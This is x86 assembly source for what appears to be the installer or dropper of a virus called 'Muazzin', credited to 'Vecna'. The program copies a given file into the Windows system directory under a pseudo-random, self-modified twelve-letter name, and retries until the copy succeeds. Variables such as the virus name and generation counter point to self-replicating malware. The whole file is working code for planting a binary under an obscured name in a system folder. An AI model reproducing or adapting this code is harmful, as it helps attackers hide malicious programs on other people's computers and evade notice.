.386
model flat
locals __

callW  macro   _xxx
  extrn   _xxx:proc
       call    _xxx
endm

CRC_POLY     equ 0EDB88320h
CRC_INIT     equ 000000000h

dwo equ dword ptr
wo equ word ptr
by equ byte ptr
ofs equ offset

.data
copyright db 'Muazzin installed (c) Vecna',13,10,0
help      db 'USAGE: INSTALL <signed_muazzin>',13,10,0
alldone   db 'File copied to: ',0
name_index db 1
nameseed dd CRC_POLY

vstart:
vname db 'AAAAAAAA',0
generation db 1

.data?
argc dd ?
argv0 db 260 dup (?)
argv1 db 260 dup (?)
argv2 db 260 dup (?)
argv3 db 260 dup (?)


.code

include cmdline.inc
include consts.inc
include console.inc

get_name:
       pushad
       mov edi, [esp+4+(8*4)]
       push 260
       push edi
       callW GetSystemDirectoryA
       add edi, eax
       mov cl, [name_index]
       mov edx,[nameseed]
       ror edx, cl
       push 12
       pop ecx
       mov al, "\"
       stosb
       mov eax, ecx
  @@digit:
       mov al, dl
       and al, 0fh
       add al, "A"
       stosb                                   ;build name
       rol edx, 4
       loop @@digit
       call sbox
       mov [edi], cl                           ;set 0
       mov by [edi-4], "."                     ;set .
       popad
       ret 4

sbox   PROC
;       int 3
       pushad

       lea ebp,[vstart]

       push 8
       push dwo [esp]
       pop ecx
       lea esi,[ebp+(ofs vname-ofs vstart)]
       mov ah,[esi+(ofs generation-ofs vname)]
       mov al,ah
       and al,011b
       sub by [@@modifier1],al
       sub by [@@modifier2],al

       lea ebp,[edi-12]
  @@init_sbox:
       lodsb
       xor al,[ebp+ecx]
       add al,[esi+(ofs generation-ofs vname)+ecx-8-1]
       sub ah,al
       loop @@init_sbox

       push 12
       movsx eax,ah
       pop ecx
       xchg [esp],ecx
  @@modify:
       bt eax,ecx
       jnc @@mod_1
  @@mod_0:
       inc by [ebp+ecx+3]
  @@modifier1 equ $-1
       jmp @@mod_2
  @@mod_1:
       dec by [ebp+ecx+3]
  @@modifier2 equ $-1
  @@mod_2:
       loop @@modify

       mov by [@@modifier1],3
       mov by [@@modifier2],3

       mov esi,edi
       std
       pop ecx
       lodsb
  @@fix:
       lodsb
       cmp al,'Z'
       ja @@sub_a
       sub al,'A'
       jnc @@skipz
       add by [esi+1],'Z'-'A'
       jmp @@fixed
  @@sub_a:
       sub by [esi+1],'Z'-'A'
  @@fixed:
       inc esi
       jmp @@fix
  @@skipz:
       loop @@fix
       cld

       popad
       ret
sbox   ENDP


main:
       call getcmdline

       lea edx,copyright
       call dump_asciiz_edx

       cmp argc,2
       je @@retry

       lea edx,help
       call dump_asciiz_edx

       jmp @@done

  @@retry:
       push ofs argv2
       call get_name
       inc by [name_index]

       push 1
       push ofs argv2
       push ofs argv1
       callW CopyFileA

       test eax,eax
       jz @@retry

       lea edx,alldone
       call dump_asciiz_edx
       lea edx,argv2
       call dump_asciiz_edx
       call dump_crlf

  @@done:
       push 0
       callW ExitProcess

end    main
